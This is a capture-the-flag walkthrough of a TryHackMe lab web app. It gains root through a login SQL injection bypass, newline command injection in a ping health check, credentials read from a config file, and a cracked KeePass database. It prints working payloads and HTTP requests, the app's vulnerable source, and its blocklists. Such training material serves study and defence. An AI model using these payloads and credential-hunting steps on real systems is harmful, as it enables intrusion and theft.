---
Title: Silent Monitor
Description: Enumerate a running internal service, exploit a vulnerable web application, pivot through the system, and crack your way to root.
Link: https://tryhackme.com/room/silent-monitor
Topics:
  - web-exploitation
  - sql-injection
  - command-injection
  - privilege-escalation
  - credential-reuse
  - credential-hunting
  - password-cracking
  - lateral-movement
Tools:
  - werkzeug
  - burp-suite
  - feroxbuster
  - cewl
  - john-the-ripper
  - keepass
  - nmap
THM Difficulty: Medium
THM Estimation: 30 minutes
---
#challenge
# Challenge
## Green Lights, Dark Corners
CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.

## Questions of the challenge
- What is the content of `user.txt`?
- What is the content of `root.txt`?

# Decoding the task
- There is a NOC (network operations centre) that is **Monitoring hosts**, **logging events**
	- -> We would need to look at logs and events maybe
- Someone on the NOC team has been **cutting corners**, **leaving doors open**, and **hiding things in places no one thinks to look**
	- -> search for clues/items where they should not be
	- -> debug options, ports that should not be accessible in production systems
- The **portal** is up
	- -> there is a web portal
- **secret dashboard** 
	- -> there is a dashboard. it's most likely a hidden one and basic wordlists may not find it

>[!Note] Attackbox
>This write-up assumes the TryHackMe provided attackbox is used, and therefore, the tools and wordlists from the machine is used. Should you use your own attackbox, then you will need to source the tools and wordlists yourself.
# Initial recon

>[!Note] Concept
>Perform recon on the target IP, identify ports, OS, application logic, etc...
## Set the TARGET variable

>[!Tip] Setting a TARGET variable helps us so that we can use it later on, instead of typing the IP each time

```bash
# Set the target IP variable so we don't have to type it all the time
TARGET=10.112.191.197
```
## Is the host reachable?

```bash
ping -c 1 $TARGET
PING 10.112.191.197 (10.112.191.197) 56(84) bytes of data.
64 bytes from 10.112.191.197: icmp_seq=1 ttl=64 time=1.04 ms

--- 10.112.191.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.043/1.043/1.043/0.000 ms
```

Yes, the host is reachable! It's always a good idea to ensure the host is reachable.

## Look for open ports

>[!Tip] Progressive nmap
>Start with `nmap -sS $TARGET`, then `nmap -sS $TARGET -p-` and finally `nmap -sS -sV $TARGET -p-`. The reason is that, the basic version may give enough information without the scan all the ports using `-p-`.  In this case, It is not convincing that only two ports show up, so next is to use `-p-` to scan all ports. Then port `5050` is ambiguous, , therefore  check using `-sV`.

```bash
nmap -sS -sV $TARGET -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-01 09:21 UTC
Nmap scan report for ip-10-112-191-197.eu-central-1.compute.internal (10.112.191.197)
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

There seem to be **two** accessible ports:
- **22** (SSH) - standard OpenSSH v8.9p1
- **5050** (HTTP) - https://werkzeug.palletsprojects.com/en/stable/http/

**What is Werkzeug**
Werkzeug is a comprehensive, dependency-free **WSGI web application library** for Python that provides core tools for handling HTTP requests, responses, routing, and WSGI integration. Worth having a glance at the documentation if you're not familiar with the logic: https://werkzeug.palletsprojects.com/en/stable/http/. For example: what language it is written it, how does it work, default credentials.

>[!Info] Why the server type matters
>`Werkzeug` means a Flask-style Python app using **declarative routing** - valid URLs are the strings a developer wrote into `@app.route("...")` decorators, not files on disk. This reshapes discovery: a **filename** wordlist (like `big.txt`) is the wrong tool, and appending extensions (`.php`, `.zip`, ...) mostly just inflates the request count. We want **route/vocabulary** words instead.

## Investigating the port `5050`
We've identified from the `nmap` that port `5050` is reachable. Let's investigate it further:

```bash
# Set the URL variable so we don't have to type it all the time
URL=http://10.112.191.197:5050
```

**Checking the HTTP header only, looking for the HTTP response code**:
```bash
curl -I $URL
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 9259
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Sun, 01 Nov 2026 09:22:53 GMT
```

The `200 OK` response says that there is a web server responding to requests to port `5050`. -> `Werkzeug/2.0.2 Python/3.10.12`

**Checking the contents**:
Here is an extracted version  using the `curl $URL` command. It shows a standard HTML page which looks like a dashboard.  The concept is to look for clues in the HTML code (credentials, comments, hidden links). In this case, there isn't a clue:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet — Network Operations Centre</title>

</head>
<body>

<header class="topbar">
  <div class="brand">
    <div class="brand-mark">
      <svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg>
    </div>
    <div class="brand-name">CorpNet <span>Network Operations Centre</span></div>
  </div>
  <div class="topbar-right">
    <div class="status-pill">
      <span class="dot"></span>
      <span>ALL SYSTEMS NOMINAL</span>
    </div>
  </div>
</header>

</body>
</html>
```

>[!Info] `robots.txt` and `sitemap.xml`
>It's a good practice to check for these two files. In this scenario, neither of these files are present. 
>`curl -I $URL/robots.txt`
>`curl -I $URL/sitemap.xml`

**A look at the website**
There is nothing unusual about the page and there is no clickable link either, which we already guessed by looking at the HTML code earlier:

![[silent_monitor_01.png]]

# Searching for files/directories
The challenge talks about portal and **leaving doors open**, and **hiding things in places no one thinks to look**. The next logical step is to search for files and directories.
Using `cewl` to scrap the website contents and `feroxbuster` to search for files and directories:

**prepare the tool** (`feroxbuster` is used here):
```bash
#Create a directory to store the tool and thefiles
mkdir -p $HOME/challenge/feroxbuster

# Download and install the tool
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s $HOME/challenge/feroxbuster
```

**prepare the environment**:
The `$URL` has already been set. If not, set it:
```bash
Ensure the $URL contains the correct value
echo $URL
http://10.112.191.197:5050
```

**Set the `WORDLIST` we will use with the `feroxbuster`**:
```bash
# Use cewl to create a word list of all words on a website page
cewl $URL -w list.txt  

# create a second list by converting all the words to lowercase. Why? increase the chance
cewl --lowercase $URL -w list_lowercase.txt  

# merge the two lists into a single file
cat list.txt list_lowercase.txt > all_lists.txt  

# assign the newly created file to the WORDLIST variable
WORDLIST=/root/challenge/feroxbuster/all_lists.txt  
```

>[!Tip] Why `cewl`?
>Generic wordlists (filenames, then an API-route list) both missed to find the path. `cewl` scrapes the site's own words and feeds them back as candidate routes - the "places no one thinks to look" clue pointing at the app's own vocabulary. This is what finally surfaced `/internal`.

**Identify the size of a 404 page** -> 3424. We will use this as an example to filer out all the `404` pages
```bash
curl -I $URL/test
HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 3424
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Sun, 01 Nov 2026 10:00:38 GMT
```

**Run it**:
```bash
cd $HOME/challenge/feroxbuster

./feroxbuster -u $URL -w $WORDLIST -S 3424 -s 200,301,302 -d 3 -o challenge_site_scrap_3.txt
```

BINGO! we have found a new link: `/internal`:

```
200      GET      370l      980w     9259c http://10.112.191.197:5050/
200      GET      264l      912w     8770c http://10.112.191.197:5050/internal
```

>[!Info] `-s` vs `-C` in feroxbuster, and don't let the scanner lie to you
>- `-s 200,301,302` = **allow-list** (show *only* these codes). Tight, but it will silently hide a protected route that answers `403`/`401`/`302`. Here `/internal` returns `200`, so we got lucky.
>- `-C 404` = **deny-list** (show *everything except* these codes). The safer default, so a protected route can't slip past.
>- A `-C 404` run did **not** re-surface `/internal` - almost certainly an auto-filter / output-file artifact. But `/internal` was already proven real by loading it in the browser. **Trust direct observation over a filtered scan.**

**Check the link on a browser**

![[silent_monitor_02.png]]

# Cracking the "Sign In" page

## Understanding the authentication mechanism
Using "**Burp Suite**", identify the authentication mechanism:
- Use the "**Burp Suite**" proxy to capture the traffic
- attempt to authenticate on the "**Sign In**" page
- Observe in the "Burp Suite" Proxy, the following:
	- `POST` is used
	- `Content-Type: application/x-www-form-urlencoded`
	- `username=noc&password=password` in the body section
- from the HTML source:
	- `<form method="POST" action="/internal" autocomplete="off">` is used
	- the input field names: `<input type="text" id="username" name="username", <input type="password" id="password" name="password"`

```http
POST /internal HTTP/1.1
Host: 10.112.191.197:5050
Content-Length: 30
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.191.197:5050
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.191.197:5050/internal
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=noc&password=password
```

We have no username, so password spraying/brute force should not be the first option here. No valid username is present in the main page either. we could guess few usernames:
- `noc`
- `admin`
- `administrator`
- `operator`

Another option is to lookup the documentation of the `Werkzeug/2.0.2` if it has default credentials. In this case, there isn't any default credentials. 

## Analysing the response
The response to a random credentials test reveals the error message:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8973
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Sun, 01 Nov 2026 10:49:17 GMT
```

Observing the HTML code, the error is "**Invalid username or password.**"

```html
        <div class="alert">
          <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4h2v5H7V4zm0 6h2v2H7v-2z"/></svg>
          Invalid username or password.
        </div>
```

It is important to identify if the error is always the same: is it:
- invalid username, (we could try multiple times with the hope of finding a username that works)
- invalid password, (this means the username most likely is valid)
- Invalid username or password. (this most likely means that web server does not reveal if the username is valid or not)

Examples attempted:
```
username=test&password=12345  
username=1234&password=123434  
username=noc&password=123456  
username=admin&password=admin
username=operator&password=password
```

This will help identify if we have a valid username. In this example, it is always "Invalid username or password.", which means the server is most likely smart not to leak a valid username. Identifying a valid username would allow brute force approach. 

## Attempting SQLi
using the `' OR '1'='1' --` in "Burp Suite", returns a `HTTP/1.0 302 FOUND`. BINGO! we have access to the `dashboard - http://10.112.191.197:5050/internal/dashboard`:

```http
POST /internal HTTP/1.1
Host: 10.112.191.197:5050
Content-Length: 42
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.191.197:5050
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.191.197:5050/internal
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=' OR '1'='1' --&password=password
```

```http
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 244
Location: http://10.112.191.197:5050/internal/dashboard
Vary: Cookie
Set-Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auccxQ.5GNlZHElVwyLqd9a53WIKmTDFlA; HttpOnly; Path=/
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Sun, 01 Nov 2026 11:04:37 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/internal/dashboard">/internal/dashboard</a>. If not click the link.
```

>[!Tip] Decode the session cookie - it explains *who* we logged in as
>The cookie is a **Flask signed** cookie. Its first dot-separated segment is base64-encoded JSON:
>```bash
>echo 'eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0' | base64 -d
># {"role":"operator","user":"netops"}
>```
>So the SQLi returned the **first row** of the users table, and the app trusted it - we land as `netops` with the `operator` role. The cookie is **signed, not encrypted**: readable, and forgeable if the signing key is weak (see [[#Roads not taken]]).


![[silent_monitor_03.png]]


![[silent_monitor_04.png]]

## Observations on the dashboard

From the "Audit log":
- There are several usernames:  we have 3 usernames: 
	- `svc-mon`
	- `jmartin`
	- `netops`

```
2026-01-14 10:00:01	svc-mon	LOGIN_OK	—
2026-01-14 11:02:51	jmartin	LOGIN_OK	—
2026-01-15 07:55:30	netops	LOGIN_OK	—
```

- Executed commands:
	- `127.0.0.1%0awhoami`

```
2026-05-19 03:16:04	netops	HEALTH_CHECK	127.0.0.1%0awhoami
2026-05-19 03:15:52	netops	HEALTH_CHECK	127.0.0.10%awhoami
```

>[!Note] The audit log is a planted hint, not background noise
>The author **seeded** the audit log with the attacker's own earlier attempts: failed SQLi logins (`' OR 1=1#`, `admin' --` -> `LOGIN_ERROR`/`LOGIN_FAIL`) sit right next to a successful `netops` login and the `127.0.0.1%0awhoami` health-check payload. In other words, the log is handing us both the **auth-bypass** idea and the exact **command-injection payload shape** - "clean logs can be written by anyone", and "places no one thinks to look".

- The "**Host Health**",  appears to have a text box that executes CLI commands. This is a good place to investigate weaknesses:

![[silent_monitor_05.png]]

# Cracking the Probe option on the Host Health Check page

Attempting the following commands. The below from the "Audit logs" is a good hint:

```
2026-05-19 03:16:04	netops	HEALTH_CHECK	127.0.0.1%0awhoami
```

| Command            | Result                                         |
| ------------------ | ---------------------------------------------- |
| `10.0.10.1 \| id`  | Invalid hostname or IP address.                |
| `10.0.10.1 % id`   | ping: id: Temporary failure in name resolution |
| `10.0.10.1  id`    | ping: id: Temporary failure in name resolution |
| `10.0.10.1 %0a id` | ping: id: Temporary failure in name resolution |
What we've learnt here:
- Some characters are blocked by a validator (`|`), -> the error: "Invalid hostname or IP address."
- Some are passing through but not doing what we hoped (`%`, literal `%0a`). -> error: "ping: id: Temporary failure in name resolution"

>[!Note] The `%0a` is the percent-encoded representation of a **line feed (newline) character**

Investigating the request using "Burp Suite", the reason the browser attempts fail becomes obvious: **the browser URL-encodes the `%` character itself**, so what we typed as `%0a` is sent on the wire as `%250a` (the `%25` is an encoded `%`). The server then decodes that **once**, turning it back into the literal text `%0a` - three characters, not a newline. That is why it reaches `ping` as junk and never injects.

The ``10.0.10.1 %0a id`` is converted to `target=10.0.10.1+%250a+id`:

```http
POST /internal/health HTTP/1.1
Host: 10.112.191.197:5050
Content-Length: 25
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.191.197:5050
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.191.197:5050/internal/health
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auce5A.CQgv0GeaYs2uVCqIkM_NNuuWisM
Connection: keep-alive

target=10.0.10.1+%250a+id
```

Fixing that in the "Burp Suite" repeater (send a single-encoded `%0a` so the server decodes it **once** into a real newline, which the shell then treats as a command separator):

```http
POST /internal/health HTTP/1.1
Host: 10.112.191.197:5050
Content-Length: 21
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.191.197:5050
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.191.197:5050/internal/health
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auce5A.CQgv0GeaYs2uVCqIkM_NNuuWisM
Connection: keep-alive

target=10.0.10.1%0aid
```

provides the result we want: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. BINGO! we have found a way to run CLI commands:

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 14860
Vary: Cookie
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Sun, 01 Nov 2026 11:32:15 GMT


	<pre class="output-pre">PING 10.0.10.1 (10.0.10.1) 56(84) bytes of data.

		--- 10.0.10.1 ping statistics ---
		2 packets transmitted, 0 received, 100% packet loss, time 1052ms
		
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
	</pre>
```

```
target=10.0.10.1%0apwd

/opt/netops
```

```
target=10.0.10.1%0als

app.py
netops.db
secret.config
templates
```

There is a `secret.config` file:

```txt
target=10.0.10.1%0acat secret.config

# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = <Where password would appear>

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

BINGO! we have credentials:

```txt
[backup_agent]
run_as   = sysadmin
password = <Where password would appear>
```

# Confirming the vulnerabilities in the source
We have `www-data` RCE **and** the `ls` above shows the app's own source (`app.py`) and database (`netops.db`) sitting in `/opt/netops`. Rather than *assume* how the SQLi and the newline-injection work, we read the code and prove it. (Both files can be read via the `%0a` injection as `www-data`, or directly once we are `root`.)

>[!Note] This step is optional for owning the box, but it turns every "I assume the validator does X" into demonstrated ground truth. The source confirms every mechanism inferred earlier - and the author even left comments admitting each bug.

## The SQL injection (login)
```python
# Vulnerable: direct string interpolation — no parameterisation
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '%s' AND password = '%s'"
) % (username, pw_hash)
...
row = db.execute(query).fetchone()
if row:
    session["user"] = row["username"]
    session["role"] = row["role"]
```

This proves the whole auth chain:
- The `username` is interpolated straight into the query -> `' OR '1'='1' --` comments out the password check. The author's own comment flags it.
- `.fetchone()` returns the **first matching row** and the app trusts `row["username"]` / `row["role"]`. That is exactly *why* we land as `netops` / `operator` - and it matches the decoded cookie `{"role":"operator","user":"netops"}`.

>[!Info] Why `UNION SELECT` would have been the hard path?
>The login fields are run through a keyword blocklist first:
>```python
>BLOCK_RE = re.compile(r"(union\s+select|drop\s+table|insert\s+into|xp_cmdshell)", re.IGNORECASE)
>```
>`union select` is blocked, so a UNION-based data dump would have needed comment/evasion tricks. The simple **auth-bypass** sidesteps the blocklist entirely - the right call.

## The command injection (health check)
```python
# vulnerable to newline injection (\n / %0a), fix soon.
PING_BLOCK_RE = re.compile(r"[;|`$&]")
...
elif PING_BLOCK_RE.search(target):
    cmd_err = "Invalid hostname or IP address."
else:
    proc = subprocess.Popen(
        "ping -c 2 -W 1 " + target,   # shell=True, string concatenation
        shell=True, ...
    )
...
log_action(session["user"], "HEALTH_CHECK", target.split("\n")[0])
```

This is the exact bug, confirmed:
- The validator blocks `; | ` $ &` -> that is **why** `10.0.10.1 | id` returned "Invalid hostname or IP address."
- **`\n` is not in that character class**, and `shell=True` with string concatenation means a real newline becomes a command separator in the shell. Hence `target=10.0.10.1%0aid` runs `id`.
- Nice detail: `log_action(..., target.split("\n")[0])` deliberately logs **only the first line**, so the audit trail shows `10.0.10.1` and hides the injected command - "clean logs can be written by anyone", implemented in code.

## Two bonus findings from the source
```python
def log_action(username, action, detail=""):
        pass          # logging is a no-op

FAKE_AUDIT = [ ("jmartin", ...), ("svc-mon", ...), ... ]   # hardcoded audit rows
```

- **The audit log is mostly fake.** `log_action()` does nothing, and the dashboard appends a hardcoded `FAKE_AUDIT` list to the few real rows. So `jmartin` and `svc-mon` and most timestamps are **props** - the only genuine activity is our own `netops` session. This confirms the "planted hint" reading even more strongly.
- **The signing key lives in an env var, not the source:**
  ```python
  app.secret_key = os.environ.get("FLASK_SECRET")
  if not app.secret_key:
      raise RuntimeError("FLASK_SECRET environment variable not set")
  ```

So the *cookie-forgery* road wasn't closed - it just needed one extra step: read `FLASK_SECRET` via the RCE (e.g. `cat /proc/<pid>/environ`) before `flask-unsign` could forge `role=admin`. We never needed to.

## The database confirms the data-extraction road
From the `netops.db` dump, the `users` table holds a single real user:

```
netops   <Where hash would appear>   operator
```

And `init_db()` shows how that value was built:

```python
pw = hashlib.md5(b"<Where password would appear>").hexdigest()
```

So the stored secret is **unsalted MD5** of `<Where password would appear>` - trivially crackable. But there is only **one** real user, which is exactly why dumping the table was never worth it and the auth-bypass was the sensible route.
# SSH access
Using the newly found credentials, let's test the SSH access:

```bash
# SSH to the target machine and login using sysadmin user
ssh sysadmin@$TARGET
The authenticity of host '10.112.191.197 (10.112.191.197)' can't be established.
ED25519 key fingerprint is SHA256:RNKGarukRQoyH1MPzdG+hto5qe31cdYkdHiRwrtb/ik.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.112.191.197' (ED25519) to the list of known hosts.
sysadmin@10.112.191.197's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Nov  1 11:39:52 UTC 2026

  System load:  0.0                Processes:             106
  Usage of /:   15.2% of 19.31GB   Users logged in:       0
  Memory usage: 54%                IPv4 address for ens5: 10.112.191.197
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

213 updates can be applied immediately.
152 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue May 19 03:18:19 2026 from 192.168.230.214
```

```bash
# Check whoami
whoami
sysadmin
```

BINGO! we have SSH access. Looking for the `user.txt` file, it appears to be in the home directory of the `sysadmin` user.

```bash
# List the contents of the directory
ls -ltra
total 36
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
drwxr-xr-x 4 root     root     4096 May 19 03:10 ..
drwx------ 2 sysadmin sysadmin 4096 May 19 03:18 .cache
drwxrwxr-x 3 sysadmin sysadmin 4096 May 19 03:29 .local
-rw-rw-r-- 1 sysadmin sysadmin   42 May 19 03:29 user.txt
drwxr-x--- 5 sysadmin sysadmin 4096 May 19 03:35 .
drwx------ 2 sysadmin sysadmin 4096 May 19 03:36 backups
```

```bash
cat user.txt 
THM{sQli_...}
```

BINGO! we have found the first flag!

# Escalating to root

## Possible ideas
Looking for a method to escalate privileges is a large topic. Here are some methods to start with. In this challenge, none of these helped - but running them is what *rules out* the local vectors and points us at the KeePass store instead:

```
sudo -l                                   # can I run anything as root/others?
id                                        # am I in adm, backup, shadow, docker, lxd, sudo?
cat /etc/passwd                           # which accounts have real shells? (you've seen backup)
find / -perm -4000 -type f 2>/dev/null    # unusual SUID binaries
ls -la /etc/cron.d/ /etc/crontab; ls -la /opt/netops/   # root-run scheduled jobs / writable scripts
```

The key outputs (this is what makes "none of these helped" an evidenced conclusion, not an assumption):

```bash
sudo -l
[sudo] password for sysadmin:
Sorry, user sysadmin may not run sudo on tryhackme-...   # no sudo rights at all

id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)   # only its own group — not shadow/adm/backup/docker/lxd
```

- `find / -perm -4000` -> only the standard Ubuntu SUID set (`sudo`, `su`, `mount`, `passwd`, `pkexec`, ...), nothing custom.
- `/opt/netops` -> **Permission denied** as `sysadmin` (a boundary, not a path).

>[!Info] A dry enumeration **is** a result
>No sudo, no privileged groups, no custom SUID, no writable root cron => the intended path runs through an asset we haven't opened yet: the **KeePass credential store** the backup README advertises.
## Identifying a keepass file
Next step is to find a way to escalate privileges to `root`. Looking in the home directory of the `sysadmin`, we can see a `backup` directory. Investigating it reveals the `infrastructure.kdbx` file.

```bash
# Change to backup directory
cd backups/

# List the contents of the directory
ls -ltra
total 16
-rw------- 1 sysadmin sysadmin 2439 May 19 03:34 infrastructure.kdbx
drwxr-x--- 5 sysadmin sysadmin 4096 May 19 03:35 ..
-rw-r--r-- 1 sysadmin sysadmin  286 May 19 03:36 README.txt
drwx------ 2 sysadmin sysadmin 4096 May 19 03:36 .

# Read the README.txt file contents
cat README.txt 
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
```

## Attempting to open the keepass file
### Download the file
From the attack machine:

```bash
# Set the target variable
TARGET=10.112.191.197

# Use scp to copy the file to the attackbox
scp sysadmin@$TARGET:/home/sysadmin/backups/infrastructure.kdbx ./challenge/
sysadmin@10.112.191.197's password: 
infrastructure.kdbx                           100% 2439     1.3MB/s   00:00    

```

```bash
cd challenge/
keepassxc infrastructure.kdbx
```

### Password re-using
Reusing the password of the `sysadmin`:  `<Where password would appear>`:

>[!Note] Concept
>Password reuse is a good idea to try. Most weaknesses are the result of password resuse

![[silent_monitor_06.png]]

Fails:

![[silent_monitor_07.png]]

### Cracking the password

Confirm it's a "database 2.x KDBX" file. In this case, it is:

```bash
file infrastructure.kdbx 
infrastructure.kdbx: Keepass password database 2.x KDBX
```

Extract the hash:
```bash
# Extract the hash
keepass2john infrastructure.kdbx > kdbx.hash

# Confirm it has correct format
cat kdbx.hash 
infrastructure:$keepass$*4*15000*c9d9f39a*0*0*0*dfa...
```

crack the password:
```bash
john kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 15000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<Where password would appear>           (infrastructure)     
1g 0:00:00:00 DONE (2026-11-01 11:53) 1.136g/s 2870p/s 2870c/s 2870C/s spring..malcolm
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

BINGO! we have the password: `<Where password would appear>`

## Open the file
```bash
keepassxc infrastructure.kdbx
```

![[silent_monitor_08.png]]

![[silent_monitor_09.png]]

## Grab the root user password

Double click on the Root password and grab it from there.

# Escalate to root
```
su - root
Password: <Where password would appear>
```

``` bash
whoami
root
```

BINGO! we are root

Quick search for the `root.txt` file reveals that it is in the home directory of the root user:

```bash
ls -ltra
total 36
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Oct 22  2024 .ssh
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-r--r--  1 root root    0 Feb 17  2026 .sudo_as_admin_successful
-rw-r--r--  1 root root   38 May 19 03:28 root.txt
-rw-------  1 root root  142 May 19 19:17 .bash_history
drwx------  5 root root 4096 May 19 19:17 .
drwxr-xr-x 19 root root 4096 Nov  1 09:19 ..
```

```bash
cat root.txt 
THM{KDBx_...}
```

We have the second flag: `THM{KDBx_...}`


# Methodology

1. **Recon** → Werkzeug on 5050 
2. **Content discovery** → `cewl` vocabulary wordlist →  `feroxbuster` -> identify the `/internal` path.
3. **Auth bypass** → SQLi `' OR '1'='1' --` → logged in as `netops`.
4. **RCE** → command injection via `%0a` newline (sent raw in Burp Suite; payload shape leaked by the audit log).
5. **Loot → lateral** → `secret.config` → `sysadmin` SSH creds → `user.txt`.
6. **Privesc** → enumeration ruled out local vectors → KeePass `.kdbx` cracked (`spring`) → root password → `root.txt`.

# Roads not taken

- **Brute force**: In the `/internal` without a valid username, this would have wasted time.
- Reverse shell: In the "Host Health Check". It may have been possible, but there was an easier way.
- **cookie forgery.** The session cookie decoded to `{"role":"operator","user":"netops"}`. The source shows the signing key is read from the `FLASK_SECRET` env var, so forging `role=admin` with `flask-unsign` was possible only after leaking that env (e.g. `cat /proc/<pid>/environ`) via the RCE. A clean alternative, but an extra step we didn't need.
- **SQLi data extraction.** A `UNION`-based dump is explicitly blocked on the login fields (`BLOCK_RE` filters `union select`), and the `users` table holds only one real account (`netops`, unsalted MD5 of `<Where password would appear>`). So extraction was both harder and pointless here - the auth-bypass was the right route. (The `jmartin` / `svc-mon` names in the dashboard turned out to be hardcoded `FAKE_AUDIT` props.)